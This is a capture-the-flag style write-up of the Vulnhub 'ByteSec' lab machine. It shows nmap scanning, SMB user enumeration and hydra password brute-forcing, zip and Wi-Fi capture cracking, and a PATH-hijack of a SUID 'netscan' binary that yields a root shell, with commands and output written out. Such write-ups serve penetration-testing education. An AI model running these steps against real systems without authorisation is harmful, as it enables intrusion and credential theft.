---
layout: default
title : muzec - Haknos Os-ByteSec Writeup
---


### Scanning With Nmap

We always start with an nmap scan.....

```Nmap -sC -sV -p- -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Thu Sep 30 15:13:12 2021 as: nmap -sC -sV -p- -oA nmap 172.16.139.234
Nmap scan report for 172.16.139.234
Host is up (0.0020s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Hacker_James
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2525/tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)
|   256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)
|_  256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)
Service Info: Host: NITIN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h09m48s, deviation: 3h10m31s, median: 2h59m48s
|_nbstat: NetBIOS name: NITIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nitin
|   NetBIOS computer name: NITIN\x00
|   Domain name: 168.1.7
|   FQDN: nitin.168.1.7
|_  System time: 2021-09-30T22:43:15+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-30T17:13:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 30 15:13:26 2021 -- 1 IP address (1 host up) scanned in 14.68 seconds
```

We have our scan result and we have SMB open let check it.


### SMBCLIENT

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/bytesec]
└─$ smbclient -L  //172.16.139.234/ -N    

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (nitin server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
But we have no share that we can access let run `enum4linux` on the target.


### Enum4linux


```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\sagar (Local User)
S-1-22-1-1001 Unix User\blackjax (Local User)
S-1-22-1-1002 Unix User\smb (Local User)

```

Found some users so i try to use it on SMB brute forcing SMB with hydra.

### HYDRA

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/bytesec]
└─$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 172.16.139.234 smb   
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-30 15:20:10
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 43033197 login tries (l:3/p:14344399), ~43033197 tries per task
[DATA] attacking smb://172.16.139.234:445/
[445][smb] host: 172.16.139.234   login: smb
[445][smb] Host: 172.16.139.234 Account: sagar Error: Invalid account (Anonymous success)
[445][smb] Host: 172.16.139.234 Account: blackjax Error: Invalid account (Anonymous success)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-30 15:21:01
```

We have smb credentials with no password now let try accessing it using `smb` with both username and share.

![image](https://user-images.githubusercontent.com/69868171/135502052-1f6d33be-dcf4-492e-b0da-5f975b44d268.png)

Now all files on my machine let check it out the first file `main.txt` .

![image](https://user-images.githubusercontent.com/69868171/135502839-6be55b4a-f497-45b7-9c4e-cac0eb3b6dd9.png)

Now `safe.zip` let try unzipping it.

![image](https://user-images.githubusercontent.com/69868171/135503325-28bc2f72-c727-4085-bc40-bf9ee82f4fee.png)

But seems we need a password now let try cracking it using `john the ripper` .

![image](https://user-images.githubusercontent.com/69868171/135503578-ca795880-efbc-41eb-a447-ffbebd61fa26.png)


Zip file cracked now let unzip the file with the password we just got from the zip file we cracked.

![image](https://user-images.githubusercontent.com/69868171/135503954-59869eeb-722c-4018-82f0-42a112fd5b79.png)

Seems we have a jpg file and a cap file probably a wireless capture file we can confirm it using wireshark.

![image](https://user-images.githubusercontent.com/69868171/135504491-77d30bb4-e7e2-4831-9fbb-1be8b8b08b13.png)

### AIRCRACK-NG

![image](https://user-images.githubusercontent.com/69868171/135504713-fc677a27-9834-4419-bf99-3d14843f80bb.png)

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/bytesec]
└─$ aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap 
```

Cap file cracked but it a password for what i try using it on the jpg image but i got nothing so i go back to the cap file again with wireshark.

![image](https://user-images.githubusercontent.com/69868171/135505098-27a535bf-15a4-40aa-b3d0-c3947dec75e9.png)

Interesting user `blackjax` now let try using it on SSH.


![image](https://user-images.githubusercontent.com/69868171/135505288-a8171394-26eb-4cfc-b7af-1394170c240e.png)

Boom we are in and we have user.txt.

![image](https://user-images.githubusercontent.com/69868171/135505471-0209f725-3f42-4fc8-97f4-2389ee20c598.png)

`sudo -l` seems the user blackjax can not run sudo now let check for SUID.


### Privilege Escalation

![image](https://user-images.githubusercontent.com/69868171/135505958-11fb2d21-fdca-41ac-aa60-1e53ebdf5b48.png)

```
find / -perm -u=s -type f 2>/dev/null
```
The strange SUID is `/usr/bin/netscan` interesting right now let check what it does.

![image](https://user-images.githubusercontent.com/69868171/135506111-51289050-e8a6-4576-9b76-562a5795d7cb.png)

Cool a `netstat` command let string it to confirm.

![image](https://user-images.githubusercontent.com/69868171/135506317-0e6fc5e4-fe92-4970-a584-689a26406c66.png)


Seems it possible we can escalate to root using Path variable let give it a shot.


![image](https://user-images.githubusercontent.com/69868171/135507147-7a23b417-037b-4df6-9a1f-c3bfbfc0cbad.png)


```
$ cd /tmp
$ echo "/bin/bash" > netstat
$ chmod 777 netstat
$ export PATH=/tmp:$PATH           
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ /usr/bin/netscan
root@nitin:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(blackjax)
root@nitin:/tmp# cd /root
root@nitin:/root# ls
root.txt
root@nitin:/root# 
```

We are root and done.


![image](https://user-images.githubusercontent.com/69868171/135507295-ed35505b-842a-4255-9ea9-538e5cb8e29f.png)


Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
